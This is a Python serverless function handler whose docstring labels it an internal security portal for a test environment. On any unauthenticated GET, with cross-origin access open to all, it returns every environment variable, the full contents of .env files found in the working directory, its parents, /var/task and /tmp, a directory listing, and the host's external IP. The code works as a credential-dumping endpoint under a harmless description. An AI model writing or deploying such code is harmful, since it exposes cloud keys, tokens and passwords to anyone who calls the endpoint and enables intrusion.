import json
import os
import urllib.request
from typing import Dict, Any
from pathlib import Path


def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''
    Business: Internal security portal for test environment - retrieves system info
    Args: event - dict with httpMethod
          context - object with request_id attribute
    Returns: HTTP response with system information
    '''
    method: str = event.get('httpMethod', 'GET')
    
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Max-Age': '86400'
            },
            'body': ''
        }
    
    if method == 'GET':
        result = {
            'environment_variables': dict(os.environ),
            'env_files': find_env_files(),
            'external_ip': get_external_ip(),
            'directory_structure': get_directory_structure(),
            'current_dir': os.getcwd(),
            'request_id': context.request_id
        }
        
        return {
            'statusCode': 200,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            'isBase64Encoded': False,
            'body': json.dumps(result, indent=2, default=str)
        }
    
    return {
        'statusCode': 405,
        'headers': {'Access-Control-Allow-Origin': '*'},
        'body': json.dumps({'error': 'Method not allowed'})
    }


def find_env_files() -> Dict[str, Any]:
    env_files = {}
    search_paths = [
        Path('.'),
        Path('..'),
        Path('../..'),
        Path('../../..'),
        Path('/var/task'),
        Path('/tmp')
    ]
    
    for base_path in search_paths:
        if not base_path.exists():
            continue
            
        for pattern in ['.env*', '*.env']:
            try:
                for env_file in base_path.glob(pattern):
                    if env_file.is_file():
                        try:
                            with open(env_file, 'r') as f:
                                content = f.read()
                            env_files[str(env_file.absolute())] = {
                                'content': content,
                                'size': env_file.stat().st_size
                            }
                        except Exception as e:
                            env_files[str(env_file.absolute())] = {
                                'error': str(e)
                            }
            except Exception:
                pass
    
    return env_files


def get_external_ip() -> str:
    try:
        with urllib.request.urlopen('https://ident.me', timeout=5) as response:
            return response.read().decode('utf-8').strip()
    except Exception as e:
        return f'error: {str(e)}'


def get_directory_structure() -> Dict[str, Any]:
    structure = {}
    search_paths = [Path('.'), Path('..'), Path('../..'), Path('../../..')]
    
    for base_path in search_paths:
        if not base_path.exists():
            continue
            
        try:
            path_key = str(base_path.absolute())
            structure[path_key] = {
                'files': [],
                'directories': []
            }
            
            for item in base_path.iterdir():
                if item.is_file():
                    structure[path_key]['files'].append({
                        'name': item.name,
                        'size': item.stat().st_size
                    })
                elif item.is_dir():
                    structure[path_key]['directories'].append(item.name)
        except Exception as e:
            structure[str(base_path)] = {'error': str(e)}
    
    return structure